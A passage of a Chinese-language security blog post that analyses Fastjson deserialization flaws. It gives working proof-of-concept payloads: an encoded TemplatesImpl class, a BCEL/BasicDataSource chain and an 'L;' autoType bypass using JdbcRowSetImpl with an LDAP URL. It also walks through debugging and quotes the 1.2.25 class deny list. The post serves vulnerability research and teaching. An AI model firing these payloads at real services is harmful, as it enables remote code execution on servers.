qYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAPAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAbAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAgAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAAEgAJABUADAATAA0AFAAWABYADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==\"],'_name':'exp','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011192659155.png" alt="image-20231011192659155"></p><h5 id="调试-2"><a class="anchor" href="#调试-2">#</a> 调试</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012144844588.png" alt="image-20231012144844588"></p><p>还是先放一张流程图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012140810836.png" alt="image-20231012140810836"></p><p>这里我将断点下在 TemplatesImpl 类的 getOutputProperties 方法这里，这个方法就是我们前面找到的那个_outputProperties 成员变量的 getter 方法，跟进到 newTransformer 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012144011808.png" alt="image-20231012144011808"></p><p>这里 defineTransletClasses 上面已经解释过，这里就不在看了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012144436526.png" alt="image-20231012144436526"></p><p>这里运行后计算器就直接弹出来了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012144514152.png" alt="image-20231012144514152"></p><p>这里放一下整个调用链</p><h4 id="bcel"><a class="anchor" href="#bcel">#</a> Bcel</h4><p>上面这个链虽然说不出网，但是它的利用条件非常苛刻，下面再记录一种稍微常用的一种不出网的利用方式，先看下面这个例子</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc24Bcel <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> classFilePath <span class="token operator">=</span> <span class="token string">"E:\\Python\\B.class"</span><span class="token punctuation">;</span> <span class="token comment">// 替换为你的类文件路径</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token comment">// 1. 读取类文件的字节码</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>classFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">int</span> bytesRead<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bytesRead <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">// 2. 获取字节码的字节数组</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化 Classloader</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span><span class="token operator">+</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011195355333.png" alt="image-20231011195355333"></p><p>上面这个例子中，前面的实际上就是获取一个字节码的过程，真正调用的其实是，下面这三行的内容</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化 Classloader</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span><span class="token operator">+</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里最后调用的 loadClass 实际上是 com.sun.org.apache.bcel.internal.util.ClassLoader 里的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012150800490.png" alt="image-20231012150800490"></p><p>最后通过这里加载字节码，想要调用到这里，需要 class 文件不为空</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012151018982.png" alt="image-20231012151018982"></p><p>Class 是在这里赋值，这里加载的字节码前面需要是 $$BCEL$$，然后调用这个 createClass 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012151130968.png" alt="image-20231012151130968"></p><p>这里会有这个 decode 方法，这就全都和上面的吻合上了，现在需要做的就是找一个 get 或者 set 调用到这个 com.sun.org.apache.bcel.internal.util.ClassLoader 里的 Classloader 方法</p><p>实际上是找到在 BasicDataSource 这个类中</p><figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>9.0.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>这里需要导入一个新的包</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012153542883.png" alt="image-20231012153542883"></p><p>就在这里，它可以通过一个 ClassLoader 去加载一个 ClassName，</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012153705737.png" alt="image-20231012153705737"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012153725928.png" alt="image-20231012153725928"></p><p>可以看到 driverClassName 和 driverClassLoader 都有对应的 set 方法，可以通过 Fastjson 特性来控制两个参数，接下来就需要寻找调用到这个 createConnectionFactory 方法的 set 或者 get 方法，也很容易找到，就走了两步</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012154503658.png" alt="image-20231012154503658"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012154531896.png" alt="image-20231012154531896"></p><p>这里是 get 方法会自行调用</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc24Bcel <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> classFilePath <span class="token operator">=</span> <span class="token string">"E:\\Python\\B.class"</span><span class="token punctuation">;</span> <span class="token comment">// 替换为你的类文件路径</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token comment">// 1. 读取类文件的字节码</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>classFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">int</span> bytesRead<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bytesRead <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">// 2. 获取字节码的字节数组</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">//        ClassLoader classLoader = new ClassLoader ();// 实例化 Classloader</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">//        classLoader.loadClass("$$BCEL$$"+code).newInstance();</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"</span><span class="token operator">+</span>code<span class="token operator">+</span><span class="token string">"\",\"driverClassLoader\":&#123;\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012155940447.png" alt="image-20231012155940447"></p><p>到这里就可以了</p><h5 id="调试-3"><a class="anchor" href="#调试-3">#</a> 调试</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012161840486.png" alt="image-20231012161840486"></p><p>还是一张流程图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012160621272.png" alt="image-20231012160621272"></p><p>这里我直接将断点下在这里，跟进 createDataSource 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012160710752.png" alt="image-20231012160710752"></p><p>然后接着跟进到 createConnectionFactory 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012160812931.png" alt="image-20231012160812931"></p><p>接着这里看一下 forname 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012160908670.png" alt="image-20231012160908670"></p><p>运行到这里 driverClassName 和 driverClassLoader 的值就已经被改变了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012161104810.png" alt="image-20231012161104810"></p><p>跟进 forName 方法，发现这里调用到 loadClass 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012161145946.png" alt="image-20231012161145946"></p><p>这里会经过一系列的判断，在前面已经分析过，最后会走到</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012161256048.png" alt="image-20231012161256048"></p><p>调用 defineClass 去加载字节码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012161323354.png" alt="image-20231012161323354"></p><p>这里放一张调用链，分析到这里，实际上这种方法是需要有相关的对应依赖才能使用的</p><h4 id="修复"><a class="anchor" href="#修复">#</a> 修复</h4><p>从 1.2.25 开始对这个漏洞进行了修复</p><figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">&lt;!--            &lt;version>1.2.24&lt;/version>--></span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.25<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>这里我将 fastjson 版本改为 1.2.25 再次尝试之前的 poc</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012164039261.png" alt="image-20231012164039261"></p><p>这里可以看到这里报错，不支持自动键入，简单调试一下</p><h5 id="调试-4"><a class="anchor" href="#调试-4">#</a> 调试</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012164912949.png" alt="image-20231012164912949"></p><p>还是在这里下断点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012164937133.png" alt="image-20231012164937133"></p><p>跟进到这个 parse 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012165002731.png" alt="image-20231012165002731"></p><p>这里也是一样，跟进到这个 parser.parse</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012165030381.png" alt="image-20231012165030381"></p><p>第一个字符判断</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012165055906.png" alt="image-20231012165055906"></p><p>这里因为是 {所以到这里，接着还是和前面一样，进到 parseObject 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012165148832.png" alt="image-20231012165148832"></p><p>第一个引号包裹的是 @type，这里看到多了一个 checkAutoType 方法，根据前面的报错，很显然就是这里的问题，这里进到 checkAutoType 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012165708387.png" alt="image-20231012165708387"></p><p>这里可以看到刚刚的报错信息，这里做了一个黑名单校验，这个 denyList 中的内容</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>bsh<span class="token punctuation">,</span>com<span class="token punctuation">.</span>mchange<span class="token punctuation">,</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">,</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>Socket</span><span class="token punctuation">,</span>java<span class="token punctuation">.</span>rmi<span class="token punctuation">,</span>javax<span class="token punctuation">.</span>xml<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">,</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span>Transformer</span><span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>myfaces<span class="token punctuation">.</span>context<span class="token punctuation">.</span>servlet<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">,</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>wicket<span class="token punctuation">.</span>util<span class="token punctuation">,</span>org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>runtime<span class="token punctuation">,</span>org<span class="token punctuation">.</span>hibernate<span class="token punctuation">,</span>org<span class="token punctuation">.</span>jboss<span class="token punctuation">,</span>org<span class="token punctuation">.</span>mozilla<span class="token punctuation">.</span>javascript<span class="token punctuation">,</span>org<span class="token punctuation">.</span>python<span class="token punctuation">.</span>core<span class="token punctuation">,</span>org<span class="token punctuation">.</span>springframework</pre></td></tr></table></figure><p>这些类都在黑名单中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013111524290.png" alt="image-20231013111524290"></p><p>在上面还有一个白名单，但是这个白名单是从配置文件中加载的，到这里都是 autoType 开启的状态</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013112759939.png" alt="image-20231013112759939"></p><p>如果 autoType 没有开启，会先判断黑名单如果指定类不在黑名单中在做白名单的校验</p><div class="note info"><p>值得一提的是，后面版本的修复基本都是在对 checkAutotype 方法逻辑漏洞的修复以及黑名单的变化</p></div><h3 id="1225-fastjson-1241-bypass"><a class="anchor" href="#1225-fastjson-1241-bypass">#</a> 1.2.25&lt;= Fastjson &lt;= 1.2.41 Bypass</h3><h4 id="jni字段描述符"><a class="anchor" href="#jni字段描述符">#</a> JNI 字段描述符</h4><p>这里绕过的写法实际上是利用了一种叫做 JNI 字段描述符的东西，它是用于表示 Java 字段类型的标识符，主要用于与本地代码进行交互，其实我在<a href="https://blog.xcu.icu/2023/09/03/JavaJVM/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">虐心短片之内存管理 - JavaJVM | Clown の Blog = (xcu.icu)</a> 这篇笔记中有简单提到过 JNI，这里简单记录一下 JNI 字段描述符</p><table><thead><tr><th style="text-align:center">Java 类型</th><th style="text-align:center">JNI 字段描述符</th></tr></thead><tbody><tr><td style="text-align:center">boolean</td><td style="text-align:center">Z</td></tr><tr><td style="text-align:center">byte</td><td style="text-align:center">B</td></tr><tr><td style="text-align:center">char</td><td style="text-align:center">C</td></tr><tr><td style="text-align:center">short</td><td style="text-align:center">S</td></tr><tr><td style="text-align:center">int</td><td style="text-align:center">I</td></tr><tr><td style="text-align:center">long</td><td style="text-align:center">J</td></tr><tr><td style="text-align:center">float</td><td style="text-align:center">F</td></tr><tr><td style="text-align:center">double</td><td style="text-align:center">D</td></tr><tr><td style="text-align:center">void</td><td style="text-align:center">V</td></tr><tr><td style="text-align:center">引用类型</td><td style="text-align:center"><code>L</code> 开始，以 <code>;</code> 结尾：表示引用类型，其中包括类、接口或数组类型。例如， <code>Ljava/lang/String;</code> 表示一个 <code>String</code> 类型的引用。如果是内部类，添加 $ 符号分隔，例如：Landroid/os/FileUtils$FileStatus;。</td></tr><tr><td style="text-align:center">数组</td><td style="text-align:center"><code>[</code> ：表示数组类型。可以与其他描述符结合使用，以表示数组类型的元素类型。例如， <code>[I</code> 表示一个 <code>int</code> 类型的数组。</td></tr><tr><td style="text-align:center">方法</td><td style="text-align:center">使用 () 表示，参数在圆括号里，返回类型在圆括号右侧，例如：(II) Z，表示 boolean func (int i,int j)。</td></tr></tbody></table><h5 id="l"><a class="anchor" href="#l">#</a> L;</h5><p>这种绕过的原理也是很简单，有点像是 php 文件上传漏洞中黑名单过滤了 php 但是我使用 php5 绕过这种</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc25to41JNI <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013173642089.png" 